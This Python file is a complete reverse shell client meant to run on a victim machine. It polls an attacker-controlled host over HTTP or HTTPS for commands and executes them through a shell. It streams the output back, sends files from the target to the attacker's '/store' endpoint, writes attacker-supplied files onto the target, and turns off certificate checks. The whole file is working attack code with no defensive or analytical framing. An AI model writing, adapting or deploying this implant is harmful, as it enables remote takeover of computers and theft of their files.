#Client ---> runs on target

from urllib import request, parse
import subprocess
import time
import os
import argparse
import ssl
import base64
import signal

# I mean who cares about ssl verification I'm no ligolo or smt
ssl._create_default_https_context = ssl._create_unverified_context

# Parse command-line arguments
parser = argparse.ArgumentParser(description='Reverse shell client')
parser.add_argument('--host', '-H', default='127.0.0.1',
                    help='Attacker IP address or domain (default: 127.0.0.1)')
parser.add_argument('--port', '-p', type=int, default=443,
                    help='Attacker port (default: 443)')
parser.add_argument('--toggle-debug', '-d', action='store_false', help='Disable debug output') # Up to you, store_true or store_false

# Use parse_known_args to ignore Jupyter's -f argument
args, unknown = parser.parse_known_args()

ATTACKER_IP = args.host
ATTACKER_PORT = args.port
DEBUG = args.toggle_debug

# Determine protocol based on port
PROTOCOL = 'https' if ATTACKER_PORT == 443 else 'http'

# Build target URL
if ATTACKER_PORT in [80, 443]:
    target_url = f'{PROTOCOL}://{ATTACKER_IP}'
else:
    target_url = f'{PROTOCOL}://{ATTACKER_IP}:{ATTACKER_PORT}'

# Track if server requested interrupt
server_interrupt = False

# Data is a dict
def send_post(data, url=None):
    if url is None:
        url = target_url
    data = {"rfile": data}
    data = parse.urlencode(data).encode()
    req = request.Request(url, data=data)
    try:
        request.urlopen(req, timeout=2)
    except Exception:
        pass  # Ignore errors during interrupt


def send_command_output(line, url=None):
    """Send command output with type marker"""
    global server_interrupt
    if url is None:
        url = target_url
    data = {"type": "command_output", "data": line}
    data = parse.urlencode(data).encode()
    req = request.Request(url, data=data)
    try:
        response = request.urlopen(req, timeout=5)
        # Check if server set interrupt flag in response
        if response.getcode() == 204:  # No content = interrupt requested
            server_interrupt = True
    except Exception as e:
        # Continue on error
        pass


def download_file(command):
    """Upload file from target to attacker (download from attacker's perspective)"""
    parts = command.strip().split(maxsplit=1)
    if len(parts) != 2:
        send_post("[-] Invalid download command. Usage: download <file_path>")
        return

    _, path = parts

    if not os.path.exists(path):
        send_post(f"[-] File not found: {path}")
        return

    # Send file with type marker
    if ATTACKER_PORT in [80, 443]:
        store_url = f'{PROTOCOL}://{ATTACKER_IP}/store'
    else:
        store_url = f'{PROTOCOL}://{ATTACKER_IP}:{ATTACKER_PORT}/store'

    with open(path, 'rb') as fp:
        send_post(fp.read(), url=store_url)


def upload_file(command):
    """Download file from attacker to target (upload from attacker's perspective)"""
    # Command format: upload <filename>:<base64_data>
    parts = command.strip().split(maxsplit=1)
    if len(parts) != 2:
        send_post("[-] Invalid upload command format")
        return

    try:
        _, payload = parts
        if ':' not in payload:
            send_post("[-] Invalid upload format. Expected filename:base64_data")
            return

        filename, b64_data = payload.split(':', 1)

        # Decode base64 data
        file_data = base64.b64decode(b64_data)

        # Save to current directory with original filename
        dest_path = os.path.join('.', filename)

        with open(dest_path, 'wb') as fp:
            fp.write(file_data)

        send_post(f"[+] File uploaded successfully to: {os.path.abspath(dest_path)}")
    except Exception as e:
        send_post(f"[-] Upload failed: {str(e)}")


def run_command(command):
    global server_interrupt
    server_interrupt = False

    # Stream command output line by line
    proc = subprocess.Popen(
        command,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        bufsize=1,
        text=True,
        encoding='utf-8',
        errors='replace',
        shell=True
    )
    
    try:
        while True:
            # Check if process has ended
            if proc.poll() is not None:
                # Process finished, drain remaining output
                for line in proc.stdout:
                    send_command_output(line)
                break
            
            # Check for interrupt first
            if server_interrupt:
                proc.kill()
                proc.wait()
                send_post("[!] Command interrupted by server")
                return
            
            # Try to read a line with timeout
            line = proc.stdout.readline()
            if line:
                send_command_output(line)
            else:
                # No output, small sleep to avoid busy waiting
                time.sleep(0.01)

        # Send completion marker, only if debug is enabled
        if DEBUG:
            send_command_output(f"[DEBUG]: Command completed with exit code: {proc.returncode}]\n")
            
    except KeyboardInterrupt:
        proc.kill()
        proc.wait()
        send_post("[!] Command interrupted by client")
    finally:
        # Clean up
        proc.stdout.close()


# Global flag for interrupt
interrupt_requested = False

def signal_handler(sig, frame):
    global interrupt_requested
    interrupt_requested = True

# Set up signal handler for graceful interrupt
signal.signal(signal.SIGINT, signal_handler)

while True:
    try:
        command = request.urlopen(target_url).read().decode().strip()

        # Check for special commands with exact prefix matching
        if command.startswith('terminate'):
            send_post("[*] Terminating client...")
            break

        elif command.startswith('download '):
            # Download from target to attacker
            download_file(command)

        elif command.startswith('upload '):
            # Upload from attacker to target
            upload_file(command)

        else:
            # Regular command execution
            run_command(command)

        time.sleep(1)
    except KeyboardInterrupt:
        # Client continues running, just breaks current operation
        send_post("[!] Operation interrupted, awaiting next command...")
        continue
    